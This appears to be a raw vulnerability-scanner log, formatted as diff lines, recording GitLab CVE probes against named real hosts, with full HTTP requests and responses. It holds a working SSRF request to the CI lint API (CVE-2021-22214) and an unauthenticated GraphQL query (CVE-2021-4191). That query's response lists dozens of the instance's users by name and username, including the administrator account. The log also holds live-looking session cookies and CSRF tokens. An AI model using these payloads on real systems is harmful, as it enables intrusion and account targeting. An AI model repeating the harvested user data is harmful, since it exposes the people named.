+Set-Cookie: _gitlab_session=25ec1d15d284747c0c38c0be5d8efc24; path=/; expires=Thu, 26 Mar 2026 08:17:33 -0000; secure; HttpOnly; SameSite=None
+X-Content-Type-Options: nosniff
+X-Download-Options: noopen
+X-Frame-Options: DENY
+X-Permitted-Cross-Domain-Policies: none
+X-Request-Id: le7kpzfNbF9
+X-Runtime: 0.070648
+X-Ua-Compatible: IE=edge
+X-Xss-Protection: 1; mode=block
+
+<!DOCTYPE html>
+<html class="devise-layout-html">
+<head prefix="og: http://ogp.me/ns#">
+<meta charset="utf-8">
+<meta content="IE=edge" http-equiv="X-UA-Compatible">
+<meta content="object" property="og:type">
+<meta content="GitLab" property="og:site_name">
+<meta content="Sign in" property="og:title">
+<meta content="GitLab Community Edition" property="og:description">
+<meta content="https://weixin.yunqiandou.com/assets/gitlab_logo-7ae504fe4f68fdebb3c2034e36621930cd36ea87924c11ff65dbcb8ed50dca58.png" property="og:image">
+<meta content="64" property="og:image:width">
+<meta content="64" property="og:image:height">
+<meta content="https://weixin.yunqiandou.com/users/sign_in" property="og:url">
+<meta content="summary" property="twitter:card">
+<meta content="Sign in" property="twitter:title">
+<meta content="GitLab Community Edition" property="twitter:description">
+<meta content="https://weixin.yunqiandou.com/assets/gitlab_logo-7ae504fe4f68fdebb3c2034e36621930cd36ea87924c11ff65dbcb8ed50dca58.png" property="twitter:image">
+
+<title>Sign in · GitLab</title>
+<meta content="GitLab Community Edition" name="description">
+<link rel="shortcut icon" type="image/png" href="/assets/favicon-7901bd695fb93edb07975966062049829afb56cf11511236e61bcf425070e36e.png" id="favicon" data-original-href="/assets/favicon-7901bd695fb93edb07975966062049829afb56cf11511236e61bcf425070e36e.png" />
+<link rel="stylesheet" media="all" href="/assets/application-4abc4e078df94075056919bd59aed6e7a0f95067039a8339b8f614924d8cb160.css" />
+<link rel="stylesheet" media="print" href="/assets/print-74c3df10dad473d66660c828e3aa54ca3bfeac6d8bb708643331403fe7211e60.css" />
+
+
+<link rel="stylesheet" media="all" href="/assets/highlight/themes/white-aa541d93e094b4420ea8e2dcd8e2ee99bb24ef1010bbbd20d427b1f9c54d42da.css" />
+<script>
+//<![CDATA[
+window.gon={};
+//]]>
+</script>
+
+
+<script src="/assets/webpack/runtime.dd9905d6.bundle.js" defer="defer"></script>
+<script src="/assets/webpack/main.4ff6e187.chunk.js" defer="defer"></script>
+<script src="/assets/webpack/commons~pages.admin.sessions~pages.ldap.omniauth_callbacks~pages.omniauth_callbacks~pages.profiles.t~f07ce35f.a6d33088.chunk.js" defer="defer"></script>
+<script src="/assets/webpack/pages.sessions.new.6586209e.chunk.js" defer="defer"></script>
+
+<meta name="csrf-param" content="authenticity_token" />
+<meta name="csrf-token" content="b52zzolUyY7ePt9vTJt6bnE9VDvkYmSCoyD0PMbHQbPYbGF8JZKC1Q+/kKKByMBw4eC86J9ya1oQy9KFQ4klag==" />
+
+<meta name="action-cable-url" content="/-/cable" />
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="#474D57" name="theme-color">
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-iphone-5a9cee0e8a51212e70b90c87c12f382c428870c0ff67d1eb034d884b78d2dae7.png" />
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-ipad-a6eec6aeb9da138e507593b464fdac213047e49d3093fc30e90d9a995df83ba3.png" sizes="76x76" />
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-iphone-retina-72e2aadf86513a56e050e7f0f2355deaa19cc17ed97bbe5147847f2748e5a3e3.png" sizes="120x120" />
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-ipad-retina-8ebe416f5313483d9c1bc772b5bbe03ecad52a54eba443e5215a22caed2a16a2.png" sizes="152x152" />
+<link color="rgb(226, 67, 41)" href="/assets/logo-d36b5212042cebc89b96df4bf6ac24e43db316143e89926c0db839ff694d2de4.svg" rel="mask-icon">
+<meta content="/assets/msapplication-tile-1196ec67452f618d39cdd85e2e3a542f76574c071051ae7effbfde01710eb17d.png" name="msapplication-TileImage">
+<meta content="#30353E" name="msapplication-TileColor">
+
+
+
+
+</head>
+
+<body class="application gl-browser-safari gl-platform-mac login-page navless ui-indigo" data-page="sessions:new" data-qa-selector="login_page">
+
+<script>
+//<![CDATA[
+gl = window.gl || {};
+gl.client = {"isSafari":true,"isMac":true};
+
+
+//]]>
+</script>
+<div class="page-wrap">
+<header class="navbar fixed-top navbar-empty">
+<svg width="24" height="24" class="tanuki-logo" viewBox="0 0 36 36">
+  <path class="tanuki-shape tanuki-left-ear" fill="#e24329" d="M2 14l9.38 9v-9l-4-12.28c-.205-.632-1.176-.632-1.38 0z"/>
+  <path class="tanuki-shape tanuki-right-ear" fill="#e24329" d="M34 14l-9.38 9v-9l4-12.28c.205-.632 1.176-.632 1.38 0z"/>
+  <path class="tanuki-shape tanuki-nose" fill="#e24329" d="M18,34.38 3,14 33,14 Z"/>
+  <path class="tanuki-shape tanuki-left-eye" fill="#fc6d26" d="M18,34.38 11.38,14 2,14 6,25Z"/>
+  <path class="tanuki-shape tanuki-right-eye" fill="#fc6d26" d="M18,34.38 24.62,14 34,14 30,25Z"/>
+  <path class="tanuki-shape tanuki-left-cheek" fill="#fca326" d="M2 14L.1 20.16c-.18.565 0 1.2.5 1.56l17.42 12.66z"/>
+  <path class="tanuki-shape tanuki-right-cheek" fill="#fca326" d="M34 14l1.9 6.16c.18.565 0 1.2-.5 1.56L18 34.38z"/>
+</svg>
+
+</header>
+
+<div class="login-page-broadcast">
+
+
+</div>
+<div class="container navless-container">
+<div class="content">
+<div class="flash-container flash-container-page sticky">
+</div>
+
+<div class="row mt-3">
+<div class="col-sm-12">
+<h1 class="mb-3 font-weight-normal">
+GitLab Community Edition
+</h1>
+</div>
+</div>
+<div class="row mb-3">
+<div class="col-sm-7 order-12 order-sm-1 brand-holder">
+
+<h3 class="mt-sm-0">
+A complete DevOps platform
+</h3>
+<p>
+GitLab is a single application for the entire software development lifecycle. From project planning and source code management to CI/CD, monitoring, and security.
+</p>
+
+</div>
+<div class="col-sm-5 order-1 order-sm-12 new-session-forms-container">
+<div id="signin-container">
+<ul class="nav-links new-session-tabs nav-tabs nav" role="tablist">
+<li class="nav-item" role="presentation">
+<a class="nav-link active" data-qa-selector="sign_in_tab" data-toggle="tab" href="#login-pane" role="tab">Sign in</a>
+</li>
+</ul>
+
+<div class="tab-content">
+<div class="login-box tab-pane active" id="login-pane" role="tabpanel">
+<div class="login-body">
+<form class="new_user gl-show-field-errors" id="new_user" aria-live="assertive" action="/users/sign_in" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="&#x2713;" /><input type="hidden" name="authenticity_token" value="3oQBoE9ud/9iLq/5EZ5l4VPtnbJEI64CS4xsTX3nb6FpddMS46g8pLOv4DTczd//wzB1YT8zodr4Z0r0+KkLeA==" /><div class="form-group">
+<label for="user_login" class="label-bold">Username or email</label>
+<input class="form-control top" autofocus="autofocus" autocapitalize="off" autocorrect="off" required="required" title="This field is required." data-qa-selector="login_field" type="text" name="user[login]" id="user_login" />
+</div>
+<div class="form-group">
+<label class="label-bold" for="user_password">Password</label>
+<input class="form-control bottom" required="required" title="This field is required." data-qa-selector="password_field" type="password" name="user[password]" id="user_password" />
+</div>
+<div class="remember-me">
+<label for="user_remember_me">
+<input name="user[remember_me]" type="hidden" value="0" /><input class="remember-me-checkbox" type="checkbox" value="1" name="user[remember_me]" id="user_remember_me" />
+<span>Remember me</span>
+</label>
+<div class="float-right">
+<a href="/users/password/new">Forgot your password?</a>
+</div>
+</div>
+<div></div>
+<div class="submit-container move-submit-down">
+<input type="submit" name="commit" value="Sign in" class="btn btn-success" data-qa-selector="sign_in_button" data-disable-with="Sign in" />
+</div>
+</form>
+</div>
+</div>
+
+</div>
+</div>
+
+</div>
+</div>
+</div>
+</div>
+<hr class="footer-fixed">
+<div class="container footer-container">
+<div class="footer-links">
+<a href="/explore">Explore</a>
+<a href="/help">Help</a>
+<a href="https://about.gitlab.com/">About GitLab</a>
+</div>
+</div>
+
+</div>
+</body>
+</html>
+
+============================================
+[vuln] [high] [CVE-2021-22214] https://sandtax.yunqiandou.com/api/v4/ci/lint?include_merged_yaml=true
+================  请求数据包 ================
+POST /api/v4/ci/lint?include_merged_yaml=true HTTP/1.1
+Host: sandtax.yunqiandou.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0
+Content-Length: 59
+Content-Type: application/json
+Accept-Encoding: gzip
+
+{"content":"include:\n  remote: http://127.0.0.1/test.yml"}
+================  请求响应包 ================
+HTTP/1.1 200 OK
+Connection: close
+Content-Length: 108
+Cache-Control: max-age=0, private, must-revalidate
+Content-Type: application/json
+Date: Thu, 26 Mar 2026 06:17:33 GMT
+Etag: W/"805096653f021c63586659db904c5471"
+Server: nginx
+Vary: Origin
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+X-Request-Id: 67BW9B6h8e7
+X-Runtime: 0.032117
+
+{"status":"invalid","errors":["Included file `http://127.0.0.1/test.yml` does not have valid YAML syntax!"]}
+============================================
+[vuln] [medium] [CVE-2021-4191] https://sandtax.yunqiandou.com/api/graphql
+================  请求数据包 ================
+POST /api/graphql HTTP/1.1
+Host: sandtax.yunqiandou.com
+User-Agent: Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 917
+Accept: */*
+Content-Type: application/json
+Origin: https://sandtax.yunqiandou.com
+Referer: https://sandtax.yunqiandou.com/-/graphql-explorer
+Accept-Encoding: gzip
+
+{"query":"# Welcome to GraphiQL\n#\n# GraphiQL is an in-browser tool for writing, validating, and\n# testing GraphQL queries.\n#\n# Type queries into this side of the screen, and you will see intelligent\n# typeaheads aware of the current GraphQL type schema and live syntax and\n# validation errors highlighted within the text.\n#\n# GraphQL queries typically start with a \"{\" character. Lines that starts\n# with a # are ignored.\n#\n# An example GraphQL query might look like:\n#\n#     {\n#       field(arg: \"value\") {\n#         subField\n#       }\n#     }\n#\n# Keyboard shortcuts:\n#\n#  Prettify Query:  Shift-Ctrl-P (or press the prettify button above)\n#\n#       Run Query:  Ctrl-Enter (or press the play button above)\n#\n#   Auto Complete:  Ctrl-Space (or just start typing)\n#\n\n{\n  users {\n    nodes {\n      id\n      name\n      username\n    }\n  }\n}","variables":null,"operationName":null}
+================  请求响应包 ================
+HTTP/1.1 200 OK
+Connection: close
+Transfer-Encoding: chunked
+Access-Control-Allow-Methods: GET, HEAD, POST, PUT, PATCH, DELETE, OPTIONS
+Access-Control-Allow-Origin: *
+Access-Control-Expose-Headers: Link, X-Total, X-Total-Pages, X-Per-Page, X-Page, X-Next-Page, X-Prev-Page, X-Gitlab-Blob-Id, X-Gitlab-Commit-Id, X-Gitlab-Content-Sha256, X-Gitlab-Encoding, X-Gitlab-File-Name, X-Gitlab-File-Path, X-Gitlab-Last-Commit-Id, X-Gitlab-Ref, X-Gitlab-Size
+Access-Control-Max-Age: 7200
+Cache-Control: max-age=0, private, must-revalidate
+Content-Type: application/json; charset=utf-8
+Date: Thu, 26 Mar 2026 06:17:33 GMT
+Etag: W/"ad332e571214fbf41c3f91b90d7adc9c"
+Referrer-Policy: strict-origin-when-cross-origin
+Server: nginx
+Vary: Origin
+X-Content-Type-Options: nosniff
+X-Download-Options: noopen
+X-Frame-Options: DENY
+X-Permitted-Cross-Domain-Policies: none
+X-Request-Id: nTcKiI3QRn3
+X-Runtime: 0.043022
+X-Ua-Compatible: IE=edge
+X-Xss-Protection: 1; mode=block
+
+{"data":{"users":{"nodes":[{"id":"gid://gitlab/User/65","name":"GitLab Alert Bot","username":"alert-bot"},{"id":"gid://gitlab/User/64","name":"zhanglijuan","username":"zhanglijuan"},{"id":"gid://gitlab/User/62","name":"yangwanli","username":"yangwanli"},{"id":"gid://gitlab/User/61","name":"wuwenyu","username":"wuwenyu"},{"id":"gid://gitlab/User/60","name":"tongmiao","username":"tongmiao"},{"id":"gid://gitlab/User/59","name":"lwj","username":"lwj"},{"id":"gid://gitlab/User/58","name":"gzt","username":"gzt"},{"id":"gid://gitlab/User/57","name":"wanglinyang","username":"wanglinyang"},{"id":"gid://gitlab/User/56","name":"hanshuai","username":"hanshuai"},{"id":"gid://gitlab/User/55","name":"heyi","username":"heyi"},{"id":"gid://gitlab/User/54","name":"meijie","username":"meijie"},{"id":"gid://gitlab/User/53","name":"lixin","username":"lixin"},{"id":"gid://gitlab/User/52","name":"zbf","username":"zbf"},{"id":"gid://gitlab/User/51","name":"liangdongdong","username":"liangdongdong"},{"id":"gid://gitlab/User/50","name":"chenwenxing","username":"chenwenxing"},{"id":"gid://gitlab/User/45","name":"wufan","username":"spirit-wufan"},{"id":"gid://gitlab/User/41","name":"jzk","username":"jzk"},{"id":"gid://gitlab/User/40","name":"zhoutianhui","username":"zhoutianhui"},{"id":"gid://gitlab/User/36","name":"黄政阳","username":"hzy"},{"id":"gid://gitlab/User/34","name":"zhouquanbo","username":"zhouquanbo"},{"id":"gid://gitlab/User/33","name":"ls","username":"ls"},{"id":"gid://gitlab/User/31","name":"9GphYZYkxe","username":"9GphYZYkxe"},{"id":"gid://gitlab/User/30","name":"zhangwei","username":"zhangwei"},{"id":"gid://gitlab/User/29","name":"chenkang@aicaihr.com","username":"chenkang"},{"id":"gid://gitlab/User/27","name":"lijiaxin","username":"lijiaxin"},{"id":"gid://gitlab/User/26","name":"heajing","username":"heajing"},{"id":"gid://gitlab/User/25","name":"yuxinyu","username":"yuxinyu"},{"id":"gid://gitlab/User/24","name":"fxl","username":"fxl"},{"id":"gid://gitlab/User/19","name":"songfeihu","username":"songfeihu"},{"id":"gid://gitlab/User/16","name":"chenyifan","username":"chenyifan"},{"id":"gid://gitlab/User/14","name":"xiaqi","username":"xiaqi"},{"id":"gid://gitlab/User/13","name":"tianmaoshan","username":"tianmaoshan"},{"id":"gid://gitlab/User/9","name":"chenpengfei","username":"chenpengfei"},{"id":"gid://gitlab/User/5","name":"Ghost User","username":"ghost"},{"id":"gid://gitlab/User/3","name":"liuyuhong","username":"lyh"},{"id":"gid://gitlab/User/2","name":"maxuefeng","username":"maxuefeng"},{"id":"gid://gitlab/User/1","name":"Administrator","username":"root"}]}}}
+============================================
+[vuln] [critical] [CVE-2022-0735] https://sandtax.yunqiandou.com/users/sign_in
+================  请求数据包 ================
+GET /users/sign_in HTTP/1.1
+Host: sandtax.yunqiandou.com
+User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+================  请求响应包 ================
+HTTP/1.1 200 OK
+Connection: close
+Transfer-Encoding: chunked
+Cache-Control: max-age=0, private, must-revalidate
+Content-Type: text/html; charset=utf-8
+Date: Thu, 26 Mar 2026 06:17:33 GMT
+Etag: W/"72dcdbfe5b3a60286dab36bc97ebd080"
+Referrer-Policy: strict-origin-when-cross-origin
+Server: nginx
+Set-Cookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqYzBOV1U1TnpRMkxUVmtPVEV0TkdNek15MWlObU5qTFRBMVpETTNZMlprTldFek9TST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--0547603df6758c50a13651b420b4fe3e46784740; path=/; expires=Mon, 26 Mar 2046 06:17:33 -0000; secure; HttpOnly; SameSite=None
+Set-Cookie: _gitlab_session=8b512346ad917a9b6fc622cbba111a07; path=/; expires=Thu, 26 Mar 2026 08:17:33 -0000; secure; HttpOnly; SameSite=None
+X-Content-Type-Options: nosniff
+X-Download-Options: noopen
+X-Frame-Options: DENY
+X-Permitted-Cross-Domain-Policies: none
+X-Request-Id: o5KqkL1I8R
+X-Runtime: 0.066343
+X-Ua-Compatible: IE=edge
+X-Xss-Protection: 1; mode=block
+
+<!DOCTYPE html>
+<html class="devise-layout-html">
+<head prefix="og: http://ogp.me/ns#">
+<meta charset="utf-8">
+<meta content="IE=edge" http-equiv="X-UA-Compatible">
+<meta content="object" property="og:type">
+<meta content="GitLab" property="og:site_name">
+<meta content="Sign in" property="og:title">
+<meta content="GitLab Community Edition" property="og:description">
+<meta content="https://sandtax.yunqiandou.com/assets/gitlab_logo-7ae504fe4f68fdebb3c2034e36621930cd36ea87924c11ff65dbcb8ed50dca58.png" property="og:image">
+<meta content="64" property="og:image:width">
+<meta content="64" property="og:image:height">
+<meta content="https://sandtax.yunqiandou.com/users/sign_in" property="og:url">
+<meta content="summary" property="twitter:card">
+<meta content="Sign in" property="twitter:title">
+<meta content="GitLab Community Edition" property="twitter:description">
+<meta content="https://sandtax.yunqiandou.com/assets/gitlab_logo-7ae504fe4f68fdebb3c2034e36621930cd36ea87924c11ff65dbcb8ed50dca58.png" property="twitter:image">
+
+<title>Sign in · GitLab</title>
+<meta content="GitLab Community Edition" name="description">
+<link rel="shortcut icon" type="image/png" href="/assets/favicon-7901bd695fb93edb07975966062049829afb56cf11511236e61bcf425070e36e.png" id="favicon" data-original-href="/assets/favicon-7901bd695fb93edb07975966062049829afb56cf11511236e61bcf425070e36e.png" />
+<link rel="stylesheet" media="all" href="/assets/application-4abc4e078df94075056919bd59aed6e7a0f95067039a8339b8f614924d8cb160.css" />
+<link rel="stylesheet" media="print" href="/assets/print-74c3df10dad473d66660c828e3aa54ca3bfeac6d8bb708643331403fe7211e60.css" />
+
+
+<link rel="stylesheet" media="all" href="/assets/highlight/themes/white-aa541d93e094b4420ea8e2dcd8e2ee99bb24ef1010bbbd20d427b1f9c54d42da.css" />
+<script>
+//<![CDATA[
+window.gon={};
+//]]>
+</script>
+
+
+<script src="/assets/webpack/runtime.dd9905d6.bundle.js" defer="defer"></script>
+<script src="/assets/webpack/main.4ff6e187.chunk.js" defer="defer"></script>
+<script src="/assets/webpack/commons~pages.admin.sessions~pages.ldap.omniauth_callbacks~pages.omniauth_callbacks~pages.profiles.t~f07ce35f.a6d33088.chunk.js" defer="defer"></script>
+<script src="/assets/webpack/pages.sessions.new.6586209e.chunk.js" defer="defer"></script>
+
+<meta name="csrf-param" content="authenticity_token" />
+<meta name="csrf-token" content="CQvD4O0NnYgVnDz98NU6LVg9ASilZnHRB/ZEVnRYk9pqtNDz3xBvTbteyEr35i8apHfu8lLk6S03yWwzaWqCPg==" />
+
+<meta name="action-cable-url" content="/-/cable" />
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="#474D57" name="theme-color">
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-iphone-5a9cee0e8a51212e70b90c87c12f382c428870c0ff67d1eb034d884b78d2dae7.png" />
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-ipad-a6eec6aeb9da138e507593b464fdac213047e49d3093fc30e90d9a995df83ba3.png" sizes="76x76" />
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-iphone-retina-72e2aadf86513a56e050e7f0f2355deaa19cc17ed97bbe5147847f2748e5a3e3.png" sizes="120x120" />
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-ipad-retina-8ebe416f5313483d9c1bc772b5bbe03ecad52a54eba443e5215a22caed2a16a2.png" sizes="152x152" />
+<link color="rgb(226, 67, 41)" href="/assets/logo-d36b5212042cebc89b96df4bf6ac24e43db316143e89926c0db839ff694d2de4.svg" rel="mask-icon">
+<meta content="/assets/msapplication-tile-1196ec67452f618d39cdd85e2e3a542f76574c071051ae7effbfde01710eb17d.png" name="msapplication-TileImage">
+<meta content="#30353E" name="msapplication-TileColor">
+
+
+
+
+</head>
+
+<body class="application gl-browser-safari gl-platform-windows login-page navless ui-indigo" data-page="sessions:new" data-qa-selector="login_page">
+
+<script>
+//<![CDATA[
+gl = window.gl || {};
+gl.client = {"isSafari":true,"isWindows":true};
+
+
+//]]>
+</script>
+<div class="page-wrap">
+<header class="navbar fixed-top navbar-empty">
+<svg width="24" height="24" class="tanuki-logo" viewBox="0 0 36 36">
+  <path class="tanuki-shape tanuki-left-ear" fill="#e24329" d="M2 14l9.38 9v-9l-4-12.28c-.205-.632-1.176-.632-1.38 0z"/>
+  <path class="tanuki-shape tanuki-right-ear" fill="#e24329" d="M34 14l-9.38 9v-9l4-12.28c.205-.632 1.176-.632 1.38 0z"/>
+  <path class="tanuki-shape tanuki-nose" fill="#e24329" d="M18,34.38 3,14 33,14 Z"/>
+  <path class="tanuki-shape tanuki-left-eye" fill="#fc6d26" d="M18,34.38 11.38,14 2,14 6,25Z"/>
+  <path class="tanuki-shape tanuki-right-eye" fill="#fc6d26" d="M18,34.38 24.62,14 34,14 30,25Z"/>
+  <path class="tanuki-shape tanuki-left-cheek" fill="#fca326" d="M2 14L.1 20.16c-.18.565 0 1.2.5 1.56l17.42 12.66z"/>
+  <path class="tanuki-shape tanuki-right-cheek" fill="#fca326" d="M34 14l1.9 6.16c.18.565 0 1.2-.5 1.56L18 34.38z"/>
+</svg>
+
+</header>
+
+<div class="login-page-broadcast">
+
+
+</div>
+<div class="container navless-container">
+<div class="content">
+<div class="flash-container flash-container-page sticky">
+</div>
+
+<div class="row mt-3">
+<div class="col-sm-12">
+<h1 class="mb-3 font-weight-normal">
+GitLab Community Edition
+</h1>
+</div>
+</div>
+<div class="row mb-3">
+<div class="col-sm-7 order-12 order-sm-1 brand-holder">
+
+<h3 class="mt-sm-0">
+A complete DevOps platform
+</h3>
+<p>
+GitLab is a single application for the entire software development lifecycle. From project planning and source code management to CI/CD, monitoring, and security.
+</p>
+
+</div>
+<div class="col-sm-5 order-1 order-sm-12 new-session-forms-container">
+<div id="signin-container">
+<ul class="nav-links new-session-tabs nav-tabs nav" role="tablist">
+<li class="nav-item" role="presentation">
+<a class="nav-link active" data-qa-selector="sign_in_tab" data-toggle="tab" href="#login-pane" role="tab">Sign in</a>
+</li>
+</ul>
+
+<div class="tab-content">
+<div class="login-box tab-pane active" id="login-pane" role="tabpanel">
+<div class="login-body">
+<form class="new_user gl-show-field-errors" id="new_user" aria-live="assertive" action="/users/sign_in" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="&#x2713;" /><input type="hidden" name="authenticity_token" value="qZpgHNlcEPzjSMeTGh1727JFAeOaW6OFWmSzP7HLlyLKJXMP60HiOU2KMyQdLm7sTg/uOW3ZO3lqW5tarPmGxg==" /><div class="form-group">
+<label for="user_login" class="label-bold">Username or email</label>
+<input class="form-control top" autofocus="autofocus" autocapitalize="off" autocorrect="off" required="required" title="This field is required." data-qa-selector="login_field" type="text" name="user[login]" id="user_login" />
+</div>
+<div class="form-group">
+<label class="label-bold" for="user_password">Password</label>
+<input class="form-control bottom" required="required" title="This field is required." data-qa-selector="password_field" type="password" name="user[password]" id="user_password" />
+</div>
+<div class="remember-me">
+<label for="user_remember_me">
+<input name="user[remember_me]" type="hidden" value="0" /><input class="remember-me-checkbox" type="checkbox" value="1" name="user[remember_me]" id="user_remember_me" />
+<span>Remember me</span>
+</label>
+<div class="float-right">
+<a href="/users/password/new">Forgot your password?</a>
+</div>
+</div>
+<div></div>
+<div class="submit-container move-submit-down">
+<input type="submit" name="commit" value="Sign in" class="btn btn-success" data-qa-selector="sign_in_button" data-disable-with="Sign in" />
+</div>
+</form>
+</div>
+</div>
+
+</div>
+</div>
+
+</div>
+</div>
+</div>
+</div>
+<hr class="footer-fixed">
+<div class="container footer-container">
+<div class="footer-links">
+<a href="/explore">Explore</a>
+<a href="/help">Help</a>
+<a href="https://about.gitlab.com/">About GitLab</a>
+</div>
+</div>
+
+</div>
+</body>
+</html>
+
+============================================
+[vuln] [critical] [CVE-2021-22205] https://sandtax.yunqiandou.com/users/sign_in
+================  请求数据包 ================
+GET /users/sign_in HTTP/1.1
+Host: sandtax.yunqiandou.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.11 Mobile/15E148 Safari/604.1
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+================  请求响应包 ================
+HTTP/1.1 200 OK
+Connection: close
+Transfer-Encoding: chunked
+Cache-Control: max-age=0, private, must-revalidate
+Content-Type: text/html; charset=utf-8
+Date: Thu, 26 Mar 2026 06:17:33 GMT
+Etag: W/"a30e546f97838f17a7e2c17376ef6cca"
+Referrer-Policy: strict-origin-when-cross-origin
+Server: nginx
+Set-Cookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqVXhaV1JtTUdVMExUTTFNV1F0TkRNd01TMDVZamsxTFRrMk1ERmhZMkUyWkRsaFlTST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--63a738f600b8780ceb9bf163c6f2c4e324359002; path=/; expires=Mon, 26 Mar 2046 06:17:33 -0000; secure; HttpOnly; SameSite=None
+Set-Cookie: _gitlab_session=deb1c6774dc50649e94d99106eaf7bfe; path=/; expires=Thu, 26 Mar 2026 08:17:33 -0000; secure; HttpOnly; SameSite=None
+X-Content-Type-Options: nosniff
+X-Download-Options: noopen
+X-Frame-Options: DENY
+X-Permitted-Cross-Domain-Policies: none
+X-Request-Id: DYAr4UNVRT1
+X-Runtime: 0.024953
+X-Ua-Compatible: IE=edge
+X-Xss-Protection: 1; mode=block
+
+<!DOCTYPE html>
+<html class="devise-layout-html">
+<head prefix="og: http://ogp.me/ns#">
+<meta charset="utf-8">
+<meta content="IE=edge" http-equiv="X-UA-Compatible">
+<meta content="object" property="og:type">
+<meta content="GitLab" property="og:site_name">
+<meta content="Sign in" property="og:title">
+<meta content="GitLab Community Edition" property="og:description">
+<meta content="https://sandtax.yunqiandou.com/assets/gitlab_logo-7ae504fe4f68fdebb3c2034e36621930cd36ea87924c11ff65dbcb8ed50dca58.png" property="og:image">
+<meta content="64" property="og:image:width">
+<meta content="64" property="og:image:height">
+<meta content="https://sandtax.yunqiandou.com/users/sign_in" property="og:url">
+<meta content="summary" property="twitter:card">
+<meta content="Sign in" property="twitter:title">
+<meta content="GitLab Community Edition" property="twitter:description">
+<meta content="https://sandtax.yunqiandou.com/assets/gitlab_logo-7ae504fe4f68fdebb3c2034e36621930cd36ea87924c11ff65dbcb8ed50dca58.png" property="twitter:image">
+
+<title>Sign in · GitLab</title>
+<meta content="GitLab Community Edition" name="description">
+<link rel="shortcut icon" type="image/png" href="/assets/favicon-7901bd695fb93edb07975966062049829afb56cf11511236e61bcf425070e36e.png" id="favicon" data-original-href="/assets/favicon-7901bd695fb93edb07975966062049829afb56cf11511236e61bcf425070e36e.png" />
+<link rel="stylesheet" media="all" href="/assets/application-4abc4e078df94075056919bd59aed6e7a0f95067039a8339b8f614924d8cb160.css" />
+<link rel="stylesheet" media="print" href="/assets/print-74c3df10dad473d66660c828e3aa54ca3bfeac6d8bb708643331403fe7211e60.css" />
+
+
+<link rel="stylesheet" media="all" href="/assets/highlight/themes/white-aa541d93e094b4420ea8e2dcd8e2ee99bb24ef1010bbbd20d427b1f9c54d42da.css" />
+<script>
+//<![CDATA[
+window.gon={};
+//]]>
+</script>
+
+
+<script src="/assets/webpack/runtime.dd9905d6.bundle.js" defer="defer"></script>
+<script src="/assets/webpack/main.4ff6e187.chunk.js" defer="defer"></script>
+<script src="/assets/webpack/commons~pages.admin.sessions~pages.ldap.omniauth_callbacks~pages.omniauth_callbacks~pages.profiles.t~f07ce35f.a6d33088.chunk.js" defer="defer"></script>
+<script src="/assets/webpack/pages.sessions.new.6586209e.chunk.js" defer="defer"></script>
+
+<meta name="csrf-param" content="authenticity_token" />
+<meta name="csrf-token" content="iWv8eoMkTvtRQPTSJthf6fNT81E5qZTT49ysg1a5mnrCqOLj9yd/ANZXQ5j3ZTLJiNCiLQz5Eo0YFCEJ9ZpAIw==" />
+
+<meta name="action-cable-url" content="/-/cable" />
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="#474D57" name="theme-color">
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-iphone-5a9cee0e8a51212e70b90c87c12f382c428870c0ff67d1eb034d884b78d2dae7.png" />
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-ipad-a6eec6aeb9da138e507593b464fdac213047e49d3093fc30e90d9a995df83ba3.png" sizes="76x76" />
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-iphone-retina-72e2aadf86513a56e050e7f0f2355deaa19cc17ed97bbe5147847f2748e5a3e3.png" sizes="120x120" />
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-ipad-retina-8ebe416f5313483d9c1bc772b5bbe03ecad52a54eba443e5215a22caed2a16a2.png" sizes="152x152" />
+<link color="rgb(226, 67, 41)" href="/assets/logo-d36b5212042cebc89b96df4bf6ac24e43db316143e89926c0db839ff694d2de4.svg" rel="mask-icon">
+<meta content="/assets/msapplication-tile-1196ec67452f618d39cdd85e2e3a542f76574c071051ae7effbfde01710eb17d.png" name="msapplication-TileImage">
+<meta content="#30353E" name="msapplication-TileColor">
+
+
+
+
+</head>
+
+<body class="application gl-browser-safari gl-platform-mac login-page navless ui-indigo" data-page="sessions:new" data-qa-selector="login_page">
+
+<script>
+//<![CDATA[
+gl = window.gl || {};
+gl.client = {"isSafari":true,"isMac":true};
+
+
+//]]>
+</script>
+<div class="page-wrap">
+<header class="navbar fixed-top navbar-empty">
